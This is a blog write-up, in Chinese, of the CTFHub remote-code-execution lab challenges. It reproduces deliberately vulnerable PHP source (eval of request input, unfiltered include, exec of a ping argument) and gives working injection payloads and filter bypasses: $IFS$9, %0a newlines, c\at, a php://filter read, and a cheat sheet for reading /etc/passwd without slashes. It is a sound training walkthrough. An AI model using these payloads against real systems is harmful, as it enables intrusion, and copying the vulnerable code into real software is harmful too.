
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GuijiH6/p/18706341" title="发布于 2025-02-09 17:30">
    <span role="heading" aria-level="2">CTFHub-RCE漏洞wp</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="引言">引言</h2>
<p>题目共有如下类型</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209171809927.png" alt="" loading="lazy"></p>
<h3 id="什么是rce漏洞">什么是RCE漏洞</h3>
<p>RCE漏洞，全称是<strong>Remote Code Execution</strong>漏洞，翻译成中文就是<strong>远程代码执行</strong>漏洞。顾名思义，这是一种安全漏洞，允许攻击者在受害者的系统上远程执行任意代码</p>
<h2 id="eval执行">eval执行</h2>
<p>分析源码：</p>
<pre><code class="language-php"> &lt;?php
if (isset($_REQUEST['cmd'])) {         //检查是否有cmd参数且不为空
    eval($_REQUEST["cmd"]);            //执行cmd传入的php代码
} else {
    highlight_file(__FILE__);
}
?&gt; 
</code></pre>
<p>执行命令查看当前目录</p>
<pre><code class="language-php">?cmd=system("ls");
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207164655930.png" alt="" loading="lazy"></p>
<p>查看根目录或者上级目录一个一个查找</p>
<pre><code class="language-php">?cmd=system("ls /");
?cmd=system("ls ../../../");
</code></pre>
<p>发现flag文件</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207164833196.png" alt="" loading="lazy"></p>
<p><strong>cat /flag_8751</strong>即可</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207164939167.png" alt="" loading="lazy"></p>
<h2 id="文件包含">文件包含</h2>
<h3 id="文件包含-1">文件包含</h3>
<p>源码审计</p>
<pre><code class="language-php">&lt;?php
error_reporting(0);
if (isset($_GET['file'])) {                          //检查是否存在file参数且不为空
    if (!strpos($_GET["file"], "flag")) {            //过滤flag字符串
        include $_GET["file"];                       
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?&gt;
  
&lt;hr&gt;
i have a &lt;a href="shell.txt"&gt;shell&lt;/a&gt;, how to use it ?   //提示有个shell.txt文件，内容为 &lt;?php eval($_REQUEST['ctfhub']);?&gt;
</code></pre>
<p>利用文件包含读取<strong>shell.txt</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207170820304.png" alt="" loading="lazy"></p>
<p>先了解一下<strong>$_REQUEST</strong>函数，是PHP 中一个非常方便的超级全局变量，它处理来自用户输入的数据。具体来说，<code>$_REQUEST</code> 变量包含了通过 <strong>GET</strong>、<strong>POST</strong> 和 <strong>COOKIE</strong> 方法传递的数据 ，所以可以利用<strong>POST或cookie</strong>传入<strong>ctfhub</strong>变量</p>
<p>查看<strong>根目录</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207171013974.png" alt="" loading="lazy"></p>
<p>查找<strong>flag</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207171104116.png" alt="" loading="lazy"></p>
<h3 id="phpinput">php://input</h3>
<p>源码分析</p>
<pre><code class="language-php">&lt;?php
if (isset($_GET['file'])) {                                //检查是否存在file参数
    if ( substr($_GET["file"], 0, 6) === "php://" ) {      //检查参数前6位是否为 php:// ，是则执行
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?&gt;
// 给了应该phpinfo.php超链接
</code></pre>
<p>查看<strong>phpinfo.php</strong>文件，发现此处</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207171709122.png" alt="" loading="lazy"></p>
<p>抓包<strong>构造命令执行</strong>，因为有<strong>php://input</strong>，故会执行传入的<strong>php代码</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207173845974.png" alt="" loading="lazy"></p>
<p>查看<strong>flag</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207174001039.png" alt="" loading="lazy"></p>
<p>这里也可以利用<strong>php伪协议</strong>，会得到一串<strong>base64加密的flag</strong>，解密即可</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207174055536.png" alt="" loading="lazy"></p>
<p>或者：</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250207174218097.png" alt="" loading="lazy"></p>
<h3 id="读取源代码">读取源代码</h3>
<p>源码审计</p>
<pre><code class="language-php">&lt;?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {    //检查file参数是否以 php:// 开头
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);                            //代码高亮，显示源码
}
?&gt;

i don't have shell, how to get flag? 
flag in &lt;code&gt;/flag&lt;/code&gt;                             //flag在根目录
</code></pre>
<p><strong>php伪协议</strong>读取flag</p>
<pre><code class="language-php">?file=php://filter/read=/resource=/flag
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250208172657877.png" alt="" loading="lazy"></p>
<h3 id="远程包含">远程包含</h3>
<p>源码审计</p>
<pre><code class="language-php">&lt;?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {      //过滤flag字符串
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?&gt;
</code></pre>
<p>给了一个<strong>phpinfo()</strong>界面，根据题目提示，还是文件包含题，抓包利用<strong>php;//input</strong>读取</p>
<p>查看<strong>根目录</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250208180906252.png" alt="" loading="lazy"></p>
<p>读取<strong>flag</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250208181001573.png" alt="" loading="lazy"></p>
<h2 id="命令注入">命令注入</h2>
<ul>
<li>
<p>这里需要了解一下常见的命令分隔符</p>
</li>
<li>
<p><strong>; :</strong> 无论前面是否执行，后面都执行</p>
</li>
<li>
<p><strong>||（逻辑或）：</strong>前命令失败执行后命令，如果前命令成功则不执行后命令</p>
</li>
<li>
<p><strong>| ：</strong>前者结果作为后者参数使用</p>
</li>
<li>
<p><strong>&amp;&amp; ：</strong>前命令成功执行后命令，如果失败则不执行后命令</p>
</li>
<li>
<p><strong>\n：</strong>换行符，url编码%0a</p>
</li>
<li>
<p><strong>%0a</strong>  （换行）</p>
</li>
<li>
<p><strong>%0d</strong>  （回车）</p>
</li>
</ul>
<h3 id="无过滤">无过滤</h3>
<p>没有做任何过滤</p>
<p>先<strong>ping</strong>一下</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209120831022.png" alt="" loading="lazy"></p>
<p>查看<strong>该目录</strong>，使用 <strong>127.0.0.1; ls</strong> 也是可以的</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209120910155.png" alt="" loading="lazy"></p>
<p>查看<strong>26398804916519.php</strong></p>
<pre><code class="language-php">127.0.0.1 | cat 26398804916519.php
</code></pre>
<p>发现<strong>flag</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209121245554.png" alt="" loading="lazy"></p>
<h3 id="过滤cat">过滤cat</h3>
<p>查看源码：</p>
<pre><code class="language-php">&lt;?php

$res = FALSE;

if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) {   
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {           //过滤了cat字符串
        $cmd = "ping -c 4 {$ip}";                //windows默认ping4次，Linux不设置次数会一直ping
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
</code></pre>
<p>查看当前目录</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209121545141.png" alt="" loading="lazy"></p>
<p>因为cat被过滤了，此系统是linux操作系统，所以可以使用cat命令的平替，如 <strong>nl     tac     c\at     less   more  tail</strong>  等</p>
<p><strong>nl</strong>查看，得到<strong>flag</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209121938816.png" alt="" loading="lazy"></p>
<p>或者使用转义符 \ 绕过 也可以得到flag，会将c\at 分为<strong>两个字符串</strong>，则绕过cat过滤</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209122139029.png" alt="" loading="lazy"></p>
<h3 id="过滤空格">过滤空格</h3>
<p>查看源码</p>
<pre><code class="language-php">&lt;?php

$res = FALSE;

if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)) {                 //只过滤了空格
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?&gt;
</code></pre>
<p>先查看当前目录，得到flag文件  flag_11971489425983.php</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209123050233.png" alt="" loading="lazy"></p>
<p>这里介绍几个绕过空格的方法</p>
<pre><code class="language-php">$IFS$9   %09    &lt;&gt;    &lt;     {cat,flag}
</code></pre>
<p>可以绕过空格</p>
<pre><code class="language-php">127.0.0.1;cat$IFS$9flag_11971489425983.php
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209123528732.png" alt="" loading="lazy"></p>
<h3 id="过滤目录分隔符">过滤目录分隔符</h3>
<p>几种常见的 / 符号绕过方法</p>
<pre><code class="language-php">改变工作目录：cd xxx   避免使用 / 符号
环境变量截取： ${PATH:0:1}   ${HOME:0:1}
编码绕过：8进制： $(printf "\57")    16进制： $'\x2f'      $'\57'
调用命令生成：a=$(printf "/"); cat ${a}etc${a}passwd     cat  `echo /`etc`echo /`passwd
通配符替代(部分路径已知)：/???/cat /???/passwd            //匹配 /bin/cat
利用反斜杠：cat \/etc\/passwd
协议替代：file_get_contents('glob:///*'); 
</code></pre>
<p>提示：</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209160708256.png" alt="" loading="lazy"></p>
<p>源码</p>
<pre><code class="language-php">&lt;?php

$res = FALSE;

if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {         //过滤了 / 符号
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?&gt;
</code></pre>
<p>查看当前目录</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209163512670.png" alt="" loading="lazy"></p>
<p>进入该目录并查看</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209163601247.png" alt="" loading="lazy"></p>
<p>执行以下命令读取flag文件</p>
<pre><code class="language-php">127.0.0.1;cd flag_is_here;cat flag_29914267619184.php
</code></pre>
<p>得到flag</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209162214801.png" alt="" loading="lazy"></p>
<h3 id="过滤运算符">过滤运算符</h3>
<p>查看源码，可以利用 <strong>；</strong>绕过</p>
<pre><code class="language-php">&lt;?php
$res = FALSE;
if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||\&amp;)/", $ip, $m)) {          //利用正则匹配过滤了 | 和 &amp; 
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?&gt;
</code></pre>
<p>查看当前目录</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209170350520.png" alt="" loading="lazy"></p>
<p>执行以下命令</p>
<pre><code class="language-php">127.0.0.1;cat flag_4351260182213.php
</code></pre>
<p>得到flag</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209165053076.png" alt="" loading="lazy"></p>
<h3 id="综合过滤练习">综合过滤练习</h3>
<p>源码审计</p>
<pre><code class="language-php">&lt;?php
$res = FALSE;
if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||&amp;|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {  //过滤了 | &amp; ; 空格 / cat flag ctfhub
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?&gt;
</code></pre>
<p>利用换行符<strong>%0a绕过</strong>查看当前目录</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209171041032.png" alt="" loading="lazy"></p>
<p>查看根目录，没有有用信息，flag应该存在<strong>flag_is_here</strong>目录下</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209171243444.png" alt="" loading="lazy"></p>
<p>执行以下命令</p>
<pre><code class="language-php">?ip=127.0.0.1%0acd$IFS$9f\lag_is_here%0als         //flag被过滤，需要绕过
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209171531827.png" alt="" loading="lazy"></p>
<p>查看该flag</p>
<pre><code class="language-php">?ip=127.0.0.1%0acd$IFS$9f\lag_is_here%0anl$IFS$9f\lag_172132798218075.php  //绕过cat
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250209171640085.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.030397390140046297" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-02-09 17:30">2025-02-09 17:30</span>&nbsp;
<a href="https://www.cnblogs.com/GuijiH6">H轨迹H</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18706341" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18706341);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18706341', targetLink: 'https://www.cnblogs.com/GuijiH6/p/18706341', title: 'CTFHub-RCE漏洞wp' })">举报</a>
</div>
        